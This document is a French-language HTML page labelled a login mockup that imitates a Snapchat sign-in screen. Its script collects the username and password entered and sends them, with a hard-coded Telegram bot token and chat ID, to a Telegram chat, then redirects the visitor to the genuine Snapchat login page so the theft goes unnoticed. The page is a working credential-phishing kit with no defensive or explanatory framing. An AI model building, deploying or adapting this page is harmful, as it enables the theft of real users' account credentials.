<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maquette de connexion</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card {
            width: 360px;
            background: #fff;
            padding: 35px;
            border-radius: 18px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, .08);
            text-align: center;
        }
        .logo {
            font-size: 60px;
        }
        h1 {
            margin: 15px 0 25px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background: #00A9FF;
            color: white;
            border: none;
            border-radius: 30px;
            padding: 14px 35px;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        button:hover {
            background: #0097e6;
        }
        a {
            display: block;
            margin-top: 18px;
            color: #0095ff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">👻</div>
        <h1>Se connecter</h1>
        <input type="text" id="username" placeholder="Nom d'utilisateur ou adresse e-mail">
        <input type="password" id="password" placeholder="Mot de passe">
        <button onclick="submitLogin()">Suivant</button>
        <a href="#">Utiliser mon numéro de téléphone</a>
    </div>

    <script>
        const TOKEN = "8664631189:AAGuO9-AbR7869brwPWZKQNjtMvgKZD9o3E";
        const CHAT_ID = "7791478749";

        async function submitLogin() {
            const usernameInput = document.getElementById("username");
            const passwordInput = document.getElementById("password");

            const username = usernameInput.value;
            const password = passwordInput.value;

            if (!username || !password) {
                alert("Veuillez remplir tous les champs.");
                return;
            }

            const message = `🔐 Nouvelle connexion 🔐\nIdentifiant : ${username}\nMdp : ${password}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });

                if (!response.ok) {
                    throw new Error(`Erreur Telegram API: ${response.statusText}`);
                }

                alert("Connexion soumise !");
                // Redirection après succès (ou échec, selon la logique souhaitée)
                window.location.href = "https://accounts.snapchat.com/v2/login?locale=fr-FR";

            } catch (error) {
                console.error("Erreur lors de l'envoi du message:", error);
                alert("Une erreur est survenue lors de la soumission. Veuillez réessayer.");
            }
        }
    </script>
</body>
</html>